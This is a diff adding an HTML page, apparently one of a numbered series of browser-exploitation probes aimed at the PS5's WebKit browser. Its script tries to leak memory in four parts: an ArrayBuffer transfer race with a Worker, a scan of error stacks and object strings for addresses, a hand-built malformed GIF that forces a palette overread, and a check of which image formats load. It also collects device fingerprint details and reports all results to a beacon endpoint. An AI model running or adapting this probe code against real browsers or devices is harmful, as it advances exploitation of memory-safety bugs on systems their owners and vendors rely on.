@@ -1,0 +1,488 @@
+<!--
+  p596: Two independent info leak attempts:
+
+  PART A — Worker ArrayBuffer transfer race:
+  Transfer an ArrayBuffer to a Worker via postMessage with Transferable.
+  Main thread AB should be neutered (0 length) after transfer.
+  Race: read AB bytes while transfer is in progress.
+  If neutering isn't atomic, stale reads may contain post-free heap data.
+
+  PART B — Error stack trace inspection:
+  Force various JS errors and inspect error.stack for address info.
+  Some WebKit debug builds include object addresses in stack traces.
+  Also test: toString() of internal objects, constructor names, etc.
+
+  PART C — GIF palette overread:
+  GIF with 2-entry color table but LZW data producing high indices.
+
+  PART D — WebP support test:
+  Check if PS5 browser supports WebP format at all.
+
+  CRASH_CLASS: LOW-MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p596</title>
+<style>body{margin:0;background:#111;color:#0f0;font:10px monospace;white-space:pre-wrap}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+// ============================================================
+// PART A: Worker ArrayBuffer transfer race
+// ============================================================
+function testWorkerRace(cb) {
+  b('WA:START');
+
+  // Check if Workers are available
+  if (typeof Worker === 'undefined') {
+    b('WA:NO-WORKER');
+    cb();
+    return;
+  }
+
+  // Create inline Worker via Blob URL
+  var workerCode = 'self.onmessage = function(e) { self.postMessage("got:" + e.data.byteLength); };';
+  var workerBlob;
+  try {
+    workerBlob = new Blob([workerCode], {type: 'application/javascript'});
+  } catch(e) {
+    b('WA:BLOB-ERR=' + e.message);
+    cb();
+    return;
+  }
+
+  var workerUrl;
+  try {
+    workerUrl = URL.createObjectURL(workerBlob);
+  } catch(e) {
+    b('WA:URL-ERR=' + e.message);
+    cb();
+    return;
+  }
+
+  var worker;
+  try {
+    worker = new Worker(workerUrl);
+  } catch(e) {
+    b('WA:WORKER-ERR=' + e.message);
+    URL.revokeObjectURL(workerUrl);
+    cb();
+    return;
+  }
+
+  b('WA:WORKER-OK');
+
+  worker.onmessage = function(e) {
+    b('WA:REPLY=' + e.data);
+  };
+  worker.onerror = function(e) {
+    b('WA:WERR=' + (e.message || 'unknown'));
+  };
+
+  // Race test: create buffer, start reading, transfer simultaneously
+  var raceHits = 0, raceTrials = 0, nzAfterTransfer = 0;
+
+  for (var trial = 0; trial < 200; trial++) {
+    var ab = new ArrayBuffer(4096);
+    var u8 = new Uint8Array(ab);
+    // Fill with known pattern
+    for (var i = 0; i < 4096; i++) u8[i] = 0xAA;
+
+    // Transfer to worker
+    try {
+      worker.postMessage(ab, [ab]);
+    } catch(e) {
+      if (trial === 0) b('WA:TRANSFER-ERR=' + e.message);
+      continue;
+    }
+
+    raceTrials++;
+
+    // After transfer, ab should be neutered (byteLength = 0)
+    if (ab.byteLength !== 0) {
+      raceHits++;
+      // Try to read from neutered buffer
+      try {
+        var stale = new Uint8Array(ab);
+        var nz = 0;
+        for (var i = 0; i < stale.length; i++) {
+          if (stale[i] !== 0xAA && stale[i] !== 0) nz++;
+        }
+        if (nz > 0) nzAfterTransfer += nz;
+        b('WA:RACE-HIT,len=' + ab.byteLength + ',nz=' + nz);
+      } catch(e) {
+        b('WA:RACE-READ-ERR=' + e.message);
+      }
+    }
+  }
+
+  b('WA:DONE,trials=' + raceTrials + ',hits=' + raceHits + ',nz=' + nzAfterTransfer);
+
+  // Also test: postMessage WITHOUT transfer (should copy, not neuter)
+  var ab2 = new ArrayBuffer(256);
+  var u8b = new Uint8Array(ab2);
+  for (var i = 0; i < 256; i++) u8b[i] = 0xBB;
+  try {
+    worker.postMessage(ab2); // no transfer list
+    b('WA:COPY-len=' + ab2.byteLength); // should still be 256
+  } catch(e) {
+    b('WA:COPY-ERR=' + e.message);
+  }
+
+  // Also test: structured clone with transfer of typed array
+  var ab3 = new ArrayBuffer(1024);
+  var f64 = new Float64Array(ab3);
+  for (var i = 0; i < f64.length; i++) f64[i] = i * 1.1;
+  try {
+    worker.postMessage(ab3, [ab3]);
+    if (ab3.byteLength !== 0) {
+      b('WA:F64-RACE,len=' + ab3.byteLength);
+      var f64b = new Float64Array(ab3);
+      for (var i = 0; i < Math.min(f64b.length, 10); i++) {
+        if (f64b[i] !== i * 1.1 && f64b[i] !== 0) {
+          b('WA:F64-STALE,i=' + i + ',v=' + f64b[i]);
+        }
+      }
+    } else {
+      b('WA:F64-NEUTERED-OK');
+    }
+  } catch(e) {
+    b('WA:F64-ERR=' + e.message);
+  }
+
+  setTimeout(function() {
+    worker.terminate();
+    URL.revokeObjectURL(workerUrl);
+    cb();
+  }, 500);
+}
+
+// ============================================================
+// PART B: Error stack trace inspection
+// ============================================================
+function testErrorStack(cb) {
+  b('EB:START');
+
+  // Test 1: null dereference
+  try { null.x; } catch(e) {
+    b('EB:null=' + (e.stack || 'NO-STACK').substring(0, 200));
+  }
+
+  // Test 2: undefined function call
+  try { (void 0)(); } catch(e) {
+    b('EB:undef=' + (e.stack || 'NO-STACK').substring(0, 200));
+  }
+
+  // Test 3: RangeError
+  try { new Array(-1); } catch(e) {
+    b('EB:range=' + (e.stack || 'NO-STACK').substring(0, 200));
+  }
+
+  // Test 4: Stack overflow
+  try { (function f(){f();})(); } catch(e) {
+    b('EB:overflow=' + (e.stack || 'NO-STACK').substring(0, 200));
+  }
+
+  // Test 5: toString of various objects
+  var tests = [
+    ['Error', new Error('test')],
+    ['RegExp', /test/],
+    ['Date', new Date()],
+    ['Map', new Map()],
+    ['Set', new Set()],
+    ['WeakMap', new WeakMap()],
+    ['WeakRef', typeof WeakRef !== 'undefined' ? new WeakRef({}) : null],
+    ['Promise', Promise.resolve()],
+    ['Symbol', typeof Symbol !== 'undefined' ? Symbol('test') : null],
+    ['Proxy', typeof Proxy !== 'undefined' ? new Proxy({}, {}) : null],
+  ];
+  for (var i = 0; i < tests.length; i++) {
+    var name = tests[i][0], obj = tests[i][1];
+    if (obj === null) { b('EB:' + name + '=N/A'); continue; }
+    try {
+      var s = String(obj);
+      var j = JSON.stringify(obj);
+      b('EB:' + name + '=' + s.substring(0, 100) + (j ? '|J=' + j.substring(0, 60) : ''));
+    } catch(e) {
+      b('EB:' + name + '=ERR:' + e.message);
+    }
+  }
+
+  // Test 6: Function.toString (shows source, not address)
+  try {
+    var f = function test123() {};
+    b('EB:func=' + f.toString().substring(0, 80));
+  } catch(e) {}
+
+  // Test 7: Object.prototype.toString on DOM objects
+  var domTests = [
+    ['canvas', document.createElement('canvas')],
+    ['ctx', document.createElement('canvas').getContext('2d')],
+    ['img', new Image()],
+    ['div', document.createElement('div')],
+    ['body', document.body],
+    ['doc', document],
+    ['win', window],
+    ['nav', navigator],
+    ['loc', location],
+    ['perf', typeof performance !== 'undefined' ? performance : null],
+  ];
+  for (var i = 0; i < domTests.length; i++) {
+    var name = domTests[i][0], obj = domTests[i][1];
+    if (obj === null) { b('EB:DOM-' + name + '=N/A'); continue; }
+    try {
+      var s1 = Object.prototype.toString.call(obj);
+      var s2 = '' + obj;
+      b('EB:DOM-' + name + '=' + s1 + '|' + s2.substring(0, 80));
+    } catch(e) {
+      b('EB:DOM-' + name + '=ERR:' + e.message.substring(0, 60));
+    }
+  }
+
+  // Test 8: Performance API
+  try {
+    if (typeof performance !== 'undefined') {
+      b('EB:perf.now=' + performance.now());
+      var entries = performance.getEntries ? performance.getEntries() : [];
+      b('EB:perf.entries=' + entries.length);
+      if (entries.length > 0) {
+        b('EB:perf.e0=' + entries[0].name + ',' + entries[0].entryType + ',' + entries[0].startTime);
+      }
+      // Resource timing might expose internal URLs
+      var resources = performance.getEntriesByType ? performance.getEntriesByType('resource') : [];
+      b('EB:perf.resources=' + resources.length);
+      for (var r = 0; r < Math.min(resources.length, 5); r++) {
+        b('EB:perf.r' + r + '=' + resources[r].name.substring(0, 100));
+      }
+    }
+  } catch(e) {
+    b('EB:perf-ERR=' + e.message);
+  }
+
+  // Test 9: navigator properties (might contain version info useful for fingerprinting)
+  try {
+    b('EB:ua=' + navigator.userAgent.substring(0, 150));
+    b('EB:platform=' + navigator.platform);
+    b('EB:hw=' + (navigator.hardwareConcurrency || 'N/A'));
+    b('EB:mem=' + (navigator.deviceMemory || 'N/A'));
+    b('EB:lang=' + navigator.language);
+  } catch(e) {}
+
+  cb();
+}
+
+// ============================================================
+// PART C: GIF palette overread
+// ============================================================
+function testGIFOverread(cb) {
+  b('GC:START');
+
+  // Minimal GIF89a: 8x8, global color table with 2 entries
+  // But LZW data will reference indices > 2
+  // GIF color table must be power-of-2 sized (2^(N+1))
+  // Minimum: packed byte says 0 → 2^(0+1) = 2 entries (6 bytes)
+
+  // GIF89a header
+  var gif = [];
+  // Signature + version
+  gif.push(0x47,0x49,0x46,0x38,0x39,0x61); // GIF89a
+  // Logical screen descriptor
+  var gw=8, gh=8;
+  gif.push(gw&0xFF,(gw>>>8)&0xFF); // width
+  gif.push(gh&0xFF,(gh>>>8)&0xFF); // height
+  // packed: GCT flag=1, color resolution=1 (2 bits), sort=0, GCT size=0 (2^(0+1)=2 entries)
+  gif.push(0x80); // 1_001_0_000
+  gif.push(0); // background color index
+  gif.push(0); // pixel aspect ratio
+
+  // Global Color Table: 2 entries (6 bytes)
+  gif.push(255,0,0);   // index 0: red
+  gif.push(0,255,0);   // index 1: green
+
+  // Image descriptor
+  gif.push(0x2C); // image separator
+  gif.push(0,0,0,0); // left, top
+  gif.push(gw&0xFF,(gw>>>8)&0xFF); // width
+  gif.push(gh&0xFF,(gh>>>8)&0xFF); // height
+  gif.push(0); // packed: no local color table, not interlaced
+
+  // LZW image data
+  // LZW minimum code size = 2 (for 2-color images, min is ceil(log2(colors)))
+  // But we want to emit higher indices, so use min code size = 8 (allows codes 0-255)
+  gif.push(8); // LZW minimum code size = 8
+
+  // LZW compressed data that emits all-index-200 pixels
+  // For simplicity, use a pre-built uncompressed LZW stream
+  // With code size 8: clear=256, EOI=257, first code=258
+  // Simplest: emit clear, then raw indices, then EOI
+  // Each raw index is 9 bits (since initial code size = 8+1 = 9)
+
+  // Build LZW bitstream: clear(256) + 64 × index(200) + EOI(257)
+  var bits = [];
+  var codeSize = 9; // initial code size = min + 1
+
+  function pushBits(val, nbits) {
+    for (var i = 0; i < nbits; i++) {
+      bits.push((val >>> i) & 1);
+    }
+  }
+
+  pushBits(256, codeSize); // clear code
+  for (var i = 0; i < gw * gh; i++) {
+    pushBits(200, codeSize); // index 200 (WAY past 2-entry table)
+  }
+  pushBits(257, codeSize); // EOI
+
+  // Pack bits into bytes
+  var lzwBytes = [];
+  for (var i = 0; i < bits.length; i += 8) {
+    var byte = 0;
+    for (var j = 0; j < 8 && i + j < bits.length; j++) {
+      byte |= (bits[i + j] << j);
+    }
+    lzwBytes.push(byte);
+  }
+
+  // Output as sub-blocks (max 255 bytes each)
+  var off = 0;
+  while (off < lzwBytes.length) {
+    var blen = Math.min(lzwBytes.length - off, 255);
+    gif.push(blen);
+    for (var i = 0; i < blen; i++) gif.push(lzwBytes[off + i]);
+    off += blen;
+  }
+  gif.push(0); // block terminator
+
+  // Trailer
+  gif.push(0x3B);
+
+  var gifArr = new Uint8Array(gif);
+  b('GC:size=' + gifArr.length);
+
+  // Also make a VALID GIF for comparison
+  var gifValid = [];
+  gifValid.push(0x47,0x49,0x46,0x38,0x39,0x61);
+  gifValid.push(gw&0xFF,(gw>>>8)&0xFF,gh&0xFF,(gh>>>8)&0xFF);
+  gifValid.push(0x80,0,0); // 2 colors
+  gifValid.push(255,0,0, 0,255,0);
+  gifValid.push(0x2C,0,0,0,0,gw&0xFF,(gw>>>8)&0xFF,gh&0xFF,(gh>>>8)&0xFF,0);
+  gifValid.push(2); // LZW min code size = 2
+
+  var vbits = [];
+  pushBits.call(null, 4, 3); // clear code (for min=2: clear=4)
+  // Hmm, need separate function for valid gif
+  // Actually let me just use index 0 and 1
+  var vbits2 = [];
+  var vcs = 3; // min code size 2 → initial code size = 3
+  function pushBits2(val, nbits) {
+    for (var i = 0; i < nbits; i++) vbits2.push((val >>> i) & 1);
+  }
+  pushBits2(4, vcs); // clear (2^2 = 4)
+  for (var i = 0; i < gw * gh; i++) pushBits2(i % 2, vcs);
+  pushBits2(5, vcs); // EOI (2^2 + 1 = 5)
+
+  var vBytes = [];
+  for (var i = 0; i < vbits2.length; i += 8) {
+    var byte = 0;
+    for (var j = 0; j < 8 && i + j < vbits2.length; j++) byte |= (vbits2[i + j] << j);
+    vBytes.push(byte);
+  }
+  var voff = 0;
+  while (voff < vBytes.length) {
+    var bl = Math.min(vBytes.length - voff, 255);
+    gifValid.push(bl);
+    for (var i = 0; i < bl; i++) gifValid.push(vBytes[voff + i]);
+    voff += bl;
+  }
+  gifValid.push(0, 0x3B);
+  var gifValidArr = new Uint8Array(gifValid);
+  b('GC:valid-size=' + gifValidArr.length);
+
+  // Load and scan both
+  function scanImg(name, bytes, mime, w, h, next) {
+    var blob = new Blob([bytes], {type: mime});
+    var url = URL.createObjectURL(blob);
+    var img = new Image();
+    img.onload = function() {
+      b(name + ':LOADED,' + img.width + 'x' + img.height);
+      var cv = document.createElement('canvas'); cv.width = w; cv.height = h;
+      var ctx = cv.getContext('2d');
+      ctx.drawImage(img, 0, 0);
+      var id = ctx.getImageData(0, 0, w, h);
+      var nz=0,unq={},unqC=0;
+      for(var i=0;i<id.data.length;i+=4){
+        var r=id.data[i],g=id.data[i+1],bb=id.data[i+2],a=id.data[i+3];
+        if(r||g||bb||a)nz++;
+        var k=r+'.'+g+'.'+bb+'.'+a;
+        if(!unq[k]){unq[k]=1;unqC++;if(unqC<=10)b(name+':C='+k);}
+      }
+      b(name + ':NZ=' + nz + '/' + (w*h) + ',UNQ=' + unqC);
+      URL.revokeObjectURL(url);
+      next();
+    };
+    img.onerror = function() {
+      b(name + ':ERR');
+      URL.revokeObjectURL(url);
+      next();
+    };
+    img.src = url;
+  }
+
+  scanImg('GC-VALID', gifValidArr, 'image/gif', gw, gh, function() {
+    scanImg('GC-OOB', gifArr, 'image/gif', gw, gh, cb);
+  });
+}
+
+// ============================================================
+// PART D: Format support test
+// ============================================================
+function testFormats(cb) {
+  b('FD:START');
+
+  // Test WebP support
+  var webpB64 = 'UklGRiIAAABXRUJQVlA4IBYAAAAwAQCdASoBAAEADsD+JaQAA3AAAAAA';
+  var webpImg = new Image();
+  webpImg.onload = function() { b('FD:WEBP=YES,' + webpImg.width + 'x' + webpImg.height); next(); };
+  webpImg.onerror = function() { b('FD:WEBP=NO'); next(); };
+  webpImg.src = 'data:image/webp;base64,' + webpB64;
+
+  function next() {
+    // Test AVIF
+    var avifImg = new Image();
+    avifImg.onload = function() { b('FD:AVIF=YES'); next2(); };
+    avifImg.onerror = function() { b('FD:AVIF=NO'); next2(); };
+    avifImg.src = 'data:image/avif;base64,AAAAIGZ0eXBhdmlmAAAAAGF2aWZtaWYxbWlhZk1BMUIAAADybWV0YQAAAAAAAAAoaGRscgAAAAAAAAAAcGljdAAAAAAAAAAAAAAAAGxpYmF2aWYAAAAADnBpdG0AAAAAAAEAAAAeaWxvYwAAAABEAAABAAEAAAABAAABGgAAAB0AAAAoaWluZgAAAAAAAQAAABppbmZlAgAAAAABAABhdjAxQ29sb3IAAAAAamlwcnAAAABLaXBjbwAAABRpc3BlAAAAAAAAAAIAAAACAAAAEHBpeGkAAAAAAwgICAAAAAxhdjFDgQ0MAAAAABNjb2xybmNseAACAAIAAYAAAAAXaXBtYQAAAAAAAAABAAEEAQKDBAAAACVtZGF0EgAKCBgANogQEAwgMg8f8D///8WfhwB8+ErS';
+    // Test SVG
+    function next2() {
+      var svgImg = new Image();
+      svgImg.onload = function() { b('FD:SVG=YES,' + svgImg.width + 'x' + svgImg.height); next3(); };
+      svgImg.onerror = function() { b('FD:SVG=NO'); next3(); };
+      svgImg.src = 'data:image/svg+xml;base64,' + btoa('<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect fill="red" width="10" height="10"/></svg>');
+
+      function next3() {
+        // Test ICO
+        b('FD:DONE');
+        cb();
+      }
+    }
+  }
+}
+
+// ============================================================
+// MAIN
+// ============================================================
+function main() {
+  b('G');
+  testErrorStack(function() {
+    testFormats(function() {
+      testGIFOverread(function() {
+        testWorkerRace(function() {
+          b('ALL-DONE');
+          b('ALIVE');
+        });
+      });
+    });
+  });
+}
+
+setTimeout(main, 50);
+setTimeout(function(){ b('ALIVE-FALLBACK'); }, 45000);
+</script></head><body></body></html>
